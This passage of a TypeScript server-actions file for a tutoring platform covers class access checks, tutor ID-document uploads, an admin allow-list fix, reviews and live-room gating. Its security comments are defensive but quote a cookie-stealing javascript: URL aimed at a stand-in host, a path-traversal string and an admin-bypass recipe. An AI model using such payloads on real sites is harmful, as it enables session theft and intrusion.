  const [c] = await db.select().from(classes).where(eq(classes.id, id)).limit(1);
  if (!c) return null;
  const [tut] = await db.select().from(tutors).where(eq(tutors.id, c.tutorId)).limit(1);

  /* Who is asking? Three tiers, and they decide two separate things:
       – whether the class is visible at all
       – whether the ROOM LINKS come back with it                                   */
  const session = await getSession();
  const uid = session?.profile.id ?? null;
  const isOwner = Boolean(uid && tut?.profileId === uid);

  let hasBooking = false;
  if (uid && !isOwner) {
    const [bk] = await db.select({ status: bookings.status }).from(bookings)
      .where(and(eq(bookings.classId, c.id), eq(bookings.studentId, uid))).limit(1);
    hasBooking = Boolean(bk && bk.status !== "cancelled");
  }
  const entitled = isOwner || hasBooking;

  /* VISIBILITY — /class/[id] is a PUBLIC route (not in middleware's matcher), and
     this action had no tutor-status check, so a draft/pending/REJECTED tutor's
     classes were fully readable and bookable by direct link even though /explore
     and the storefront hide them. Non-verified tutors are now visible only to the
     tutor themselves and to students who already hold a booking (so a tutor who
     gets un-verified later doesn't break their existing students' class page). */
  if (tut?.status !== "verified" && !entitled) return null;

  /* ROOM LINKS — the real leak. meet_url is the ONLY thing protecting the live
     video room: lib/live.ts derives a deterministic Jitsi URL from the class id and
     Jitsi rooms are open to anyone holding the link. getClass() returned it to
     EVERY caller, and /class/[id] is public — so any anonymous visitor could read
     the server-action response (or call the action directly), lift the room URL and
     walk into a live session full of minors. canJoinClass() was gating the /live
     page while getClass() handed out the key next to it.

     Now the links only ship to someone canJoinClass() would also admit: the owning
     tutor, or a student with a live booking. The /live page reads gate.meetUrl from
     canJoinClass() and only calls getClass() after the gate passes, so nothing in
     the UI regresses; /class and /checkout never rendered these fields. */
  const d = new Date(c.scheduledAt);
  return {
    id: c.id,
    tutor_id: c.tutorId,
    tutor_name: tut?.fullName ?? undefined,
    title: c.title,
    description: c.description ?? undefined,
    day: String(d.getDate()),
    month: DASH_MONTHS[d.getMonth()] ?? "",
    time: d.toLocaleTimeString("fr-FR", { hour: "2-digit", minute: "2-digit" }),
    duration_min: c.durationMin ?? 90,
    price_tnd: Number(c.priceTnd),
    seats: c.seats ?? 0,
    seats_left: Math.max(0, (c.seats ?? 0) - (c.seatsTaken ?? 0)),
    is_free_first: Boolean(c.isFreeFirst),
    meet_url: entitled ? resolveMeetUrl(c) : undefined,
    whiteboard_url: entitled ? (c.whiteboardUrl ?? undefined) : undefined,
    quiz_url: entitled ? (c.quizUrl ?? undefined) : undefined,
    replay_url: entitled ? (c.replayUrl ?? undefined) : undefined,
    status: c.status ?? "scheduled",
  };
}

/* ===================== Tutor verification =====================
   Identity (ID) is required; diploma/experience/links are optional trust
   boosters. On submit the tutor goes to "pending" (hidden from Explore +
   public storefront) until an admin approves. Files are stored on local disk
   under ./.storage (gitignored) — swap for a cloud bucket in production. */

// STORAGE_DIR points at a persistent volume in prod (e.g. /var/data on Render);
// falls back to a local ./.storage folder in dev.
const STORAGE_BASE = process.env.STORAGE_DIR || join(process.cwd(), ".storage");
const STORAGE_ROOT = join(STORAGE_BASE, "verification");
const MAX_DOC_BYTES = 8 * 1024 * 1024; // 8 MB per file
const OK_MIME = /^(image\/(jpeg|png|webp|heic|heif)|application\/pdf)$/;
const DOC_FIELDS: { field: string; kind: DocKind; required?: boolean }[] = [
  { field: "idFront", kind: "id_front", required: true },
  { field: "idBack", kind: "id_back" },
  { field: "selfie", kind: "selfie" },
  { field: "diploma", kind: "diploma" },
  { field: "certificate", kind: "certificate" },
  { field: "roleProof", kind: "role_proof" },
];
const MAX_DOCS_PER_TUTOR = 24; // ~4 rounds of the 6 fields — a resubmit budget, not a bucket

/* Content sniffing. `File.type` is just the Content-Type the CLIENT put in the
   multipart part — it is attacker-chosen and proves nothing. The OK_MIME check
   above therefore only ever established what the uploader CLAIMED. Since the admin
   doc route streams these bytes back with that same claimed type, "HTML file
   labelled image/png" was a stored-XSS payload aimed at the one session that can
   read every tutor's national ID scan.

   So: verify the magic bytes. If the header doesn't match a format we accept, the
   upload is refused — regardless of what the client called it. Cheap, dependency-free,
   and it also stops polyglots from being written to disk in the first place. */
function sniffMime(buf: Buffer): string | null {
  if (buf.length < 12) return null;
  // JPEG: FF D8 FF
  if (buf[0] === 0xff && buf[1] === 0xd8 && buf[2] === 0xff) return "image/jpeg";
  // PNG: 89 50 4E 47 0D 0A 1A 0A
  if (buf.subarray(0, 8).equals(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]))) return "image/png";
  // PDF: %PDF-
  if (buf.subarray(0, 5).toString("latin1") === "%PDF-") return "application/pdf";
  // RIFF....WEBP
  if (buf.subarray(0, 4).toString("latin1") === "RIFF" && buf.subarray(8, 12).toString("latin1") === "WEBP") {
    return "image/webp";
  }
  // ISO-BMFF (HEIC/HEIF): bytes 4..8 = "ftyp", brand at 8..12
  if (buf.subarray(4, 8).toString("latin1") === "ftyp") {
    const brand = buf.subarray(8, 12).toString("latin1");
    if (["heic", "heix", "hevc", "heim", "heis", "hevm", "mif1", "msf1"].includes(brand)) return "image/heic";
  }
  return null;
}

/* ADMIN GATE.

   BUG (fixed): this used to be
       (process.env.ADMIN_PHONES ?? "").split(",").map(s => normalizePhone(s.trim())).filter(Boolean)
   and normalizePhone("") returns "+216" — it prefixes the Tunisian country code to
   an empty string. `.filter(Boolean)` runs AFTER the map, so it never sees the "".
   Consequences:
     • ADMIN_PHONES unset/empty  → the admin list is ["+216"], NOT [].
     • a trailing comma          → "+216" is silently appended to the real list.
   And requireAdmin() compared it against normalizePhone(session.profile.phone ?? "")
   — which is ALSO "+216" whenever a profile's phone is null (the column is
   nullable). Null-phone profile + unset ADMIN_PHONES = full admin: the pending
   verification queue and every uploaded national ID scan.

   Fix: drop empty entries BEFORE normalizing, require a non-empty admin list, and
   require the session to carry a real phone. Fails closed on a misconfigured env. */
function adminPhones(): string[] {
  return (process.env.ADMIN_PHONES ?? "")
    .split(",")
    .map((s) => s.trim())
    .filter((s) => s.length > 0)      // ← the fix: never normalize an empty string
    .map((s) => normalizePhone(s))
    .filter((p) => isValidPhone(p));  // and never trust a junk entry
}

async function requireAdmin() {
  const allow = adminPhones();
  if (allow.length === 0) {
    console.error("[Tnajem] ADMIN_PHONES is not configured — refusing all admin access.");
    return null; // fail closed, never open
  }
  const session = await getSession();
  if (!session) return null;

  const phone = (session.profile.phone ?? "").trim();
  if (!phone) return null; // a profile with no phone can never be an admin

  const normalized = normalizePhone(phone);
  if (!isValidPhone(normalized)) return null;
  return allow.includes(normalized) ? session : null;
}

export async function submitVerification(formData: FormData):
  Promise<{ ok: boolean; demo?: boolean; error?: string; retryAfter?: number }> {
  if (!dbReady) return { ok: true, demo: true };
  const session = await getSession();
  if (!session) return { ok: false, error: "not-authenticated" };
  const [mine] = await db.select().from(tutors).where(eq(tutors.profileId, session.profile.id)).limit(1);
  if (!mine) return { ok: false, error: "no-storefront" };

  /* Throttle. Each call can write up to 6 × 8 MB and there was NO limit on how
     often you could call it: a signed-in tutor could loop this and fill the disk
     (the same volume the app and every other tutor's documents live on). */
  const rl = await checkRateLimit(`verif:${mine.id}`, 5, 60 * 60_000); // 5 submissions / hour / tutor
  if (!rl.ok) return { ok: false, error: "too-many-requests", retryAfter: rl.retryAfter };

  /* Hard cap on stored documents per tutor. Rate limiting bounds the RATE; this
     bounds the TOTAL, so a patient attacker can't drip-feed the disk full over days.
     Rows are only ever removed by the retention purge (lib/retention.ts). */
  const [{ n: docCount } = { n: 0 }] = await db
    .select({ n: sql<number>`count(*)::int` })
    .from(verificationDocs)
    .where(eq(verificationDocs.tutorId, mine.id));

  // Collect + validate files (idFront required).
  const incoming: { kind: DocKind; file: File; bytes: Buffer; mime: string }[] = [];
  for (const d of DOC_FIELDS) {
    const f = formData.get(d.field);
    if (f instanceof File && f.size > 0) {
      // Size is checked BEFORE we read the body into memory.
      if (f.size > MAX_DOC_BYTES) return { ok: false, error: "file-too-large" };
      if (!OK_MIME.test(f.type)) return { ok: false, error: "bad-file-type" };

      const bytes = Buffer.from(await f.arrayBuffer());
      // Belt and braces: a lying Content-Length can't smuggle a bigger body past us.
      if (bytes.length > MAX_DOC_BYTES) return { ok: false, error: "file-too-large" };

      // The real gate: what the bytes ACTUALLY are, not what the client claimed.
      const sniffed = sniffMime(bytes);
      if (!sniffed || !OK_MIME.test(sniffed)) return { ok: false, error: "bad-file-type" };

      incoming.push({ kind: d.kind, file: f, bytes, mime: sniffed });
    } else if (d.required) {
      return { ok: false, error: "id-required" };
    }
  }

  if (docCount + incoming.length > MAX_DOCS_PER_TUTOR) {
    return { ok: false, error: "too-many-documents" };
  }

  /* Persist. Files land under STORAGE_DIR/verification/<tutorId>/ — outside
     /public, so nothing here is ever served statically; the only reader is the
     admin-gated route in app/api/admin/doc/[id]. `mine.id` comes from the session's
     own tutor row, so a tutor can only ever write into their OWN folder. */
  const dir = join(STORAGE_ROOT, mine.id);
  await mkdir(dir, { recursive: true });
  for (const { kind, bytes, mime, file } of incoming) {
    // safeFileName() strips directory components and everything outside
    // [a-zA-Z0-9._-], so "../../../etc/cron.d/x" and NUL-byte tricks collapse to a
    // flat, inert name. The kind + timestamp prefix keeps it unique and non-guessable-ish.
    const safe = `${kind}-${Date.now()}-${safeFileName(file.name, 60)}`;
    await writeFile(join(dir, safe), bytes);
    await db.insert(verificationDocs).values({
      tutorId: mine.id,
      kind,
      // Store the SANITIZED name: this string is echoed into a Content-Disposition
      // header by the admin doc route, and the raw client name could carry CR/LF.
      fileName: safeFileName(file.name, 60),
      storagePath: join("verification", mine.id, safe),
      mime,                 // the SNIFFED type — never the client's claim
      sizeBytes: bytes.length,
    });
  }

  /* Text + link fields.

     BUG (fixed): these were written straight through with a bare
     `typeof v === "string" ? v.trim() : null` — no length bound and, more
     importantly, NO URL VALIDATION, unlike createClass which runs vOptionalUrl on
     meetUrl. The seven *Url fields land in the tutors row, come back out through
     getPendingVerifications()/getMyVerification(), and are rendered as <a href> on
     the admin review page and the tutor's own page. A tutor submitting
     `javascript:fetch('//evil.tn?c='+document.cookie)` as their "website" was
     therefore planting a link that fires in the ADMIN's authenticated origin — the
     one session that can read every national ID scan in the system.

     vOptionalUrl enforces an http/https scheme allow-list (lib/validation.ts), which
     is exactly what kills javascript:, data: and file:. Text fields get bounded too. */
  const textField = (k: string, max: number) => vOptionalText(formData.get(k), { field: k, max });
  const urlField = (k: string) => vOptionalUrl(formData.get(k), { field: k, max: 300 });

  const institution = textField("institution", 160);
  if (!institution.ok) return { ok: false, error: institution.error };
  const languages = textField("languages", 120);
  if (!languages.ok) return { ok: false, error: languages.error };
  const pitch = textField("pitch", 1000);
  if (!pitch.ok) return { ok: false, error: pitch.error };

  const linkedin = urlField("linkedinUrl");
  if (!linkedin.ok) return { ok: false, error: linkedin.error };
  const instagram = urlField("instagramUrl");
  if (!instagram.ok) return { ok: false, error: instagram.error };
  const tiktok = urlField("tiktokUrl");
  if (!tiktok.ok) return { ok: false, error: tiktok.error };
  const youtube = urlField("youtubeUrl");
  if (!youtube.ok) return { ok: false, error: youtube.error };
  const facebook = urlField("facebookUrl");
  if (!facebook.ok) return { ok: false, error: facebook.error };
  const website = urlField("websiteUrl");
  if (!website.ok) return { ok: false, error: website.error };
  const introVideo = urlField("introVideoUrl");
  if (!introVideo.ok) return { ok: false, error: introVideo.error };

  const yearsRaw = formData.get("experienceYears");
  const years = typeof yearsRaw === "string" && yearsRaw.trim()
    ? Math.max(0, Math.min(60, parseInt(yearsRaw, 10) || 0)) : null;

  await db.update(tutors).set({
    status: "pending", submittedAt: new Date(), reviewNote: null,
    experienceYears: years,
    institution: institution.value, languages: languages.value, pitch: pitch.value,
    linkedinUrl: linkedin.value, instagramUrl: instagram.value, tiktokUrl: tiktok.value,
    youtubeUrl: youtube.value, facebookUrl: facebook.value, websiteUrl: website.value,
    introVideoUrl: introVideo.value,
  }).where(eq(tutors.id, mine.id));

  return { ok: true };
}

export async function getMyVerification(): Promise<TutorVerification | null> {
  if (!dbReady) return null;
  const session = await getSession();
  if (!session) return null;
  const [mine] = await db.select().from(tutors).where(eq(tutors.profileId, session.profile.id)).limit(1);
  if (!mine) return null;
  const docs = await db.select().from(verificationDocs).where(eq(verificationDocs.tutorId, mine.id));
  return {
    status: mine.status,
    experienceYears: mine.experienceYears ?? null,
    institution: mine.institution ?? null,
    languages: mine.languages ?? null,
    pitch: mine.pitch ?? null,
    links: {
      linkedin: mine.linkedinUrl ?? null, instagram: mine.instagramUrl ?? null, tiktok: mine.tiktokUrl ?? null,
      youtube: mine.youtubeUrl ?? null, facebook: mine.facebookUrl ?? null, website: mine.websiteUrl ?? null,
      introVideo: mine.introVideoUrl ?? null,
    },
    reviewNote: mine.reviewNote ?? null,
    docKinds: docs.map((d) => d.kind),
  };
}

export async function getPendingVerifications():
  Promise<{ ok: boolean; admin: boolean; items: PendingTutor[] }> {
  const session = await requireAdmin();
  if (!session) return { ok: false, admin: false, items: [] };

  // Bounded: the review queue is a work list, not an export. Oldest submissions
  // first so nobody's application is starved at the bottom of an unbounded scan.
  const rows = await db
    .select()
    .from(tutors)
    .where(eq(tutors.status, "pending"))
    .orderBy(tutors.submittedAt)
    .limit(100);
  if (rows.length === 0) return { ok: true, admin: true, items: [] };

  /* N+1 (fixed): this ran one verification_docs SELECT per pending tutor inside the
     loop below. At 100 pending applications that was 101 round-trips for one page
     load. Fetch every doc for the batch in a single inArray query and group in memory. */
  const allDocs = await db
    .select()
    .from(verificationDocs)
    .where(inArray(verificationDocs.tutorId, rows.map((t) => t.id)));

  const docsByTutor = new Map<string, typeof allDocs>();
  for (const d of allDocs) {
    const list = docsByTutor.get(d.tutorId);
    if (list) list.push(d);
    else docsByTutor.set(d.tutorId, [d]);
  }

  const items: PendingTutor[] = [];
  for (const t of rows) {
    const docs = docsByTutor.get(t.id) ?? [];
    items.push({
      tutorId: t.id, slug: t.slug, name: t.fullName, subject: t.subject,
      experienceYears: t.experienceYears ?? null, institution: t.institution ?? null,
      languages: t.languages ?? null, pitch: t.pitch ?? null,
      links: {
        linkedin: t.linkedinUrl ?? null, instagram: t.instagramUrl ?? null, tiktok: t.tiktokUrl ?? null,
        youtube: t.youtubeUrl ?? null, facebook: t.facebookUrl ?? null, website: t.websiteUrl ?? null,
        introVideo: t.introVideoUrl ?? null,
      },
      submittedAt: t.submittedAt ? t.submittedAt.toISOString() : null,
      docs: docs.map((d) => ({ id: d.id, kind: d.kind, fileName: d.fileName })),
    });
  }
  return { ok: true, admin: true, items };
}

export async function approveTutor(input: { tutorId: string }): Promise<{ ok: boolean; error?: string }> {
  const session = await requireAdmin();
  if (!session) return { ok: false, error: "forbidden" };
  const tutorId = vUuid(input.tutorId, { field: "tutor" });
  if (!tutorId.ok) return { ok: false, error: "not-found" };

  const [t] = await db.select().from(tutors).where(eq(tutors.id, tutorId.value)).limit(1);
  if (!t) return { ok: false, error: "not-found" };

  // Separation of duties: an admin who also runs a tutor storefront must not be
  // able to verify their own identity documents. A second admin has to sign it off.
  if (t.profileId && t.profileId === session.profile.id) {
    return { ok: false, error: "self-approval-forbidden" };
  }
  // Only a submitted application can be approved — otherwise a draft tutor who
  // never uploaded an ID could be waved through by a misclick.
  if (t.status !== "pending") return { ok: false, error: "not-pending" };

  await db.update(tutors)
    .set({ status: "verified", verified: true, reviewedAt: new Date(), reviewNote: null })
    .where(eq(tutors.id, tutorId.value));

  /* Make the decision effective NOW, not in up to 60s (STOREFRONT_TTL) / an hour
     (SITEMAP_TTL). On approve this is a UX win — the tutor's page and the sitemap
     go live the second the admin clicks. On reject (below) it is a compliance
     control. Both helpers are non-throwing: a cache problem must never roll back
     a decision that is already committed to the database. Done BEFORE notify(),
     which does SMS I/O and is the slow part of this action. */
  revalidateTutor(t.slug);
  revalidatePublicTutors(); // the public set changed → refresh the sitemap

  // The tutor was never told before — they just watched a silent page.
  if (t.profileId) {
    await notify(t.profileId, {
      kind: "verification_approved",
      title: "Profil vérifié ✅",
      body: "Ton profil est validé. Ta page est en ligne et visible dans Explorer.",
      href: "/dashboard",
      sms: `Tnajem : ton profil est vérifié ✅ Ta page tnajem.tn/${t.slug} est en ligne.`,
    });
  }
  return { ok: true };
}

export async function rejectTutor(input: { tutorId: string; note?: string }): Promise<{ ok: boolean; error?: string }> {
  const session = await requireAdmin();
  if (!session) return { ok: false, error: "forbidden" };
  const note = vOptionalText(input.note, { field: "note", max: 500 });
  if (!note.ok) return { ok: false, error: note.error };
  const tutorId = vUuid(input.tutorId, { field: "tutor" });
  if (!tutorId.ok) return { ok: false, error: "not-found" };

  const [t] = await db.select().from(tutors).where(eq(tutors.id, tutorId.value)).limit(1);
  if (!t) return { ok: false, error: "not-found" };

  await db.update(tutors)
    .set({ status: "rejected", verified: false, reviewedAt: new Date(), reviewNote: note.value })
    .where(eq(tutors.id, tutorId.value));

  /* THE COMPLIANCE ONE. getStorefront() returns null for a non-verified tutor and
     the page 404s — but app/[slug]/page.tsx is ISR-cached for 60s, so without this
     the page of a tutor we have just REJECTED (possibly for a failed ID check, on
     a platform used by minors) keeps being served to the public for up to another
     minute, and the sitemap keeps advertising it for up to an hour. The TTL is the
     backstop; this is the control. Non-throwing by design — see approveTutor. */
  revalidateTutor(t.slug);
  revalidatePublicTutors(); // drop them from the cached sitemap too

  if (t.profileId) {
    await notify(t.profileId, {
      kind: "verification_rejected",
      title: "Dossier à compléter",
      body: note.value
        ? `Ton dossier n'a pas été validé : ${note.value}. Tu peux corriger et renvoyer.`
        : "Ton dossier n'a pas été validé. Vérifie tes documents et renvoie ta demande.",
      href: "/dashboard/verification",
      sms: "Tnajem : ton dossier de vérification doit être complété. Détails dans ton espace prof.",
    });
  }
  return { ok: true };
}

/* ---------- Explore feed (real, verified tutors only) ----------
   rating/review_count come from the reviews table, price_from from the tutor's
   cheapest published class. Filters: `subject` (chip) + `q` (free text over name,
   subject, level, bio). Demo mode (no DATABASE_URL) → null so the Explore page
   keeps its static preview; with a DB, an empty catalogue returns [] — we never
   pass demo tutors off as real ones. */
export async function getExploreTutors(filters?: { subject?: string; q?: string }): Promise<ExploreTutor[] | null> {
  // null → the client renders its static demo preview (DEV ONLY). In production a
  // missing DB must never surface fabricated tutors: return [] so /explore shows
  // its honest empty state instead.
  if (!dbReady) return demoEnabled ? null : [];

  const subject = (filters?.subject ?? "").trim();
  const q = (filters?.q ?? "").trim().slice(0, 60);

  const conds = [eq(tutors.status, "verified")];
  if (subject) conds.push(ilike(tutors.subject, `%${subject}%`));
  if (q) {
    const like = `%${q}%`;
    const text = or(
      ilike(tutors.fullName, like),
      ilike(tutors.subject, like),
      ilike(tutors.level, like),
      ilike(tutors.bio, like),
    );
    if (text) conds.push(text);
  }

  /* Bounded. This was an unbounded `select()` over the whole tutors table: it grows
     linearly with the catalogue, and /explore calls it on every keystroke-ish filter
     change. 60 cards is far more than the grid shows; the filters are the real
     navigation. (Signature unchanged — the page still calls getExploreTutors({…}).) */
  const rows = await db
    .select()
    .from(tutors)
    .where(and(...conds))
    .orderBy(desc(tutors.rating))
    .limit(60);
  if (rows.length === 0) return [];
  const ids = rows.map((t) => t.id);

  // Ratings straight from the reviews table (tutors.rating is a cached mirror of this).
  const revAgg = await db
    .select({
      tutorId: reviews.tutorId,
      avg: sql<string | null>`avg(${reviews.rating})`,
      n: sql<number>`count(*)::int`,
    })
    .from(reviews)
    .where(inArray(reviews.tutorId, ids))
    .groupBy(reviews.tutorId);
  const byTutor = new Map(revAgg.map((r) => [r.tutorId, r]));

  // "À partir de X TND" — cheapest class still on sale.
  const priceAgg = await db
    .select({ tutorId: classes.tutorId, min: sql<string | null>`min(${classes.priceTnd})` })
    .from(classes)
    .where(and(inArray(classes.tutorId, ids), ne(classes.status, "cancelled")))
    .groupBy(classes.tutorId);
  const priceByTutor = new Map(priceAgg.map((p) => [p.tutorId, p.min]));

  return rows.map((t) => {
    const agg = byTutor.get(t.id);
    const min = priceByTutor.get(t.id);
    return {
      slug: t.slug,
      full_name: t.fullName,
      subject: t.subject,
      level: t.level ?? "",
      bio: t.bio ?? "",
      avatar_initials: initials(t.fullName),
      rating: agg?.avg ? Math.round(Number(agg.avg) * 10) / 10 : 0,
      review_count: agg?.n ?? 0,
      students_count: t.studentsCount ?? 0,
      price_from_tnd: min !== null && min !== undefined ? Number(min) : null,
    };
  });
}

/* ---------- Reviews ----------
   Only the student who booked the class, only once it has started, only once.
   Writing one recomputes the tutor's public rating + students count, so the
   storefront stars stop being decoration. */
export async function createReview(input: { classId: string; rating: number; text?: string }): Promise<ActionResult> {
  const rating = vRating(input.rating);
  if (!rating.ok) return { ok: false, error: rating.error };
  const text = vOptionalText(input.text, { field: "review", max: 1000 });
  if (!text.ok) return { ok: false, error: text.error };

  if (!dbReady) return { ok: true, demo: true };
  const classId = vUuid(input.classId, { field: "class" });
  if (!classId.ok) return { ok: false, error: "not-found" };
  const session = await getSession();
  if (!session) return { ok: false, error: "not-authenticated" };
  const uid = session.profile.id;

  const rl = await checkRateLimit(`review:${uid}`, 10, 60 * 60_000); // 10 review attempts / hour
  if (!rl.ok) return { ok: false, error: "too-many-requests" };

  const [cls] = await db.select().from(classes).where(eq(classes.id, classId.value)).limit(1);
  if (!cls) return { ok: false, error: "not-found" };

  /* AUTHZ (held): you may only review a class you actually booked. The unique
     (student_id, class_id) index makes it once. Note the review is attributed to
     cls.tutorId read from the DB — NOT to any tutor id supplied by the caller — so
     there is no way to spray 5★ reviews onto someone else's storefront. */
  const [bk] = await db.select().from(bookings)
    .where(and(eq(bookings.classId, cls.id), eq(bookings.studentId, uid))).limit(1);
  if (!bk || bk.status === "cancelled") return { ok: false, error: "not-booked" };

  // No reviewing a class that hasn't happened yet.
  if (new Date(cls.scheduledAt).getTime() > Date.now()) return { ok: false, error: "class-not-started" };

  /* Insert + stat recompute in ONE transaction. recomputeTutorStats() is now a
     single UPDATE with the aggregates as subqueries (see its comment), so two
     students reviewing the same tutor concurrently can no longer both read the
     old average and write it back — the lost-update that silently dropped a review
     from the public rating. */
  try {
    await db.transaction(async (tx) => {
      await tx.insert(reviews).values({
        tutorId: cls.tutorId, studentId: uid, classId: cls.id,
        rating: rating.value, text: text.value,
      });
      await recomputeTutorStats(cls.tutorId, tx);
    });
  } catch {
    return { ok: false, error: "already-reviewed" }; // unique(student, class)
  }

  /* The storefront shows the rating + the review feed, both cached for 60s. Bust
     them so the tutor's stars move immediately. One extra point-lookup for the
     slug (indexed PK), outside the transaction — the tx above is a write path and
     must not be held open for a cache concern. */
  const [tut] = await db.select({ slug: tutors.slug }).from(tutors)
    .where(eq(tutors.id, cls.tutorId)).limit(1);
  revalidateTutor(tut?.slug);

  return { ok: true };
}

/** Reviews for a public storefront. Unknown slug → empty (never throws for a 404 page). */
export async function getTutorReviews(tutorSlug: string): Promise<TutorReviews> {
  const empty: TutorReviews = { items: [], average: 0, count: 0 };
  if (!dbReady) return empty;

  if (typeof tutorSlug !== "string" || !tutorSlug.trim()) return empty;
  const [t] = await db.select().from(tutors).where(eq(tutors.slug, tutorSlug.trim())).limit(1);
  if (!t) return empty;
  // Match getStorefront(): a non-verified tutor has no public page, so it must have
  // no public review feed either (otherwise reviews leak the existence + reputation
  // of a rejected tutor to anyone who guesses the slug).
  if (t.status !== "verified") return empty;

  /* Only the reviewer's SHORTENED name ships ("Amine K." via publicName) — never
     profiles.phone, never the raw full name, never the reviewer's profile id. This
     is a fully public, unauthenticated surface, so the projection below is the
     security boundary: it selects fullName and nothing else identifying. */
  const rows = await db
    .select({
      id: reviews.id,
      rating: reviews.rating,
      text: reviews.text,
      createdAt: reviews.createdAt,
      studentName: profiles.fullName,
      classTitle: classes.title,
    })
    .from(reviews)
    .innerJoin(profiles, eq(reviews.studentId, profiles.id))
    .leftJoin(classes, eq(reviews.classId, classes.id))
    .where(eq(reviews.tutorId, t.id))
    .orderBy(desc(reviews.createdAt))
    .limit(50);

  const items = rows.map((r) => ({
    id: r.id,
    rating: r.rating,
    text: r.text,
    studentName: publicName(r.studentName), // "Amine K." — no phone, no full identity
    classTitle: r.classTitle ?? null,
    createdAt: new Date(r.createdAt).toISOString(),
  }));

  /* BUG (fixed): average and count were computed from `items` — i.e. from the 50
     rows this query happens to return. A tutor with 200 reviews publicly displayed
     "50 avis", and the average silently became "average of the 50 most recent"
     rather than the real one. Aggregate over the whole table instead; `items` stays
     capped at 50 for the feed. */
  const [agg] = await db
    .select({ avg: sql<string | null>`avg(${reviews.rating})`, n: sql<number>`count(*)::int` })
    .from(reviews)
    .where(eq(reviews.tutorId, t.id));

  const count = agg?.n ?? 0;
  const average = agg?.avg ? Math.round(Number(agg.avg) * 10) / 10 : 0;
  return { items, average, count };
}

/* ---------- Notifications ---------- */
export async function getNotifications(): Promise<NotificationItem[]> {
  if (!dbReady) return [];
  const session = await getSession();
  if (!session) return [];

  const rows = await db
    .select()
    .from(notifications)
    .where(eq(notifications.profileId, session.profile.id))
    .orderBy(desc(notifications.createdAt))
    .limit(50);

  return rows.map((n) => ({
    id: n.id,
    kind: n.kind as NotificationKind,
    title: n.title,
    body: n.body,
    href: n.href ?? null,
    read: Boolean(n.readAt),
    createdAt: new Date(n.createdAt).toISOString(),
  }));
}

/** Marks the caller's unread notifications as read (all of them, or just `ids`). */
export async function markNotificationsRead(input?: { ids?: string[] }): Promise<ActionResult> {
  if (!dbReady) return { ok: true, demo: true };
  const session = await getSession();
  if (!session) return { ok: false, error: "not-authenticated" };

  // isUuid filter: a non-uuid string here would reach a uuid column and throw 22P02.
  // The scope below is what enforces ownership — ids only ever narrow it, never widen it.
  const ids = (input?.ids ?? []).filter((s) => isUuid(s)).slice(0, 100);
  const scope = and(eq(notifications.profileId, session.profile.id), isNull(notifications.readAt));
  await db.update(notifications).set({ readAt: new Date() })
    .where(ids.length ? and(scope, inArray(notifications.id, ids)) : scope);
  return { ok: true };
}

/* ---------- Live room access ----------
   The live page must not be open to anyone holding the URL: you can join only if
   you booked the class (active booking) or you're the tutor who owns it. */
export async function canJoinClass(classId: string): Promise<{
  canJoin: boolean; role?: "tutor" | "student"; meetUrl?: string; reason?: string;
}> {
  // Dev demo mode opens the room so the flow is walkable without a DB. In
  // production a missing DB must NEVER open a live room to anyone with the URL.
  if (!dbReady) {
    return demoEnabled
      ? { canJoin: true, role: "student", meetUrl: liveRoomUrl(classId) }
      : { canJoin: false, reason: "not-found" };
  }
  if (!isUuid(classId)) return { canJoin: false, reason: "not-found" };
  const session = await getSession();
  if (!session) return { canJoin: false, reason: "not-authenticated" };
  const uid = session.profile.id;

  const [cls] = await db.select().from(classes).where(eq(classes.id, classId)).limit(1);
  if (!cls) return { canJoin: false, reason: "not-found" };

  const [tut] = await db.select().from(tutors).where(eq(tutors.id, cls.tutorId)).limit(1);
  if (tut?.profileId === uid) return { canJoin: true, role: "tutor", meetUrl: resolveMeetUrl(cls) };

  const [bk] = await db.select().from(bookings)
    .where(and(eq(bookings.classId, cls.id), eq(bookings.studentId, uid))).limit(1);
  if (bk && bk.status !== "cancelled") return { canJoin: true, role: "student", meetUrl: resolveMeetUrl(cls) };

  return { canJoin: false, reason: "not-booked" };
}
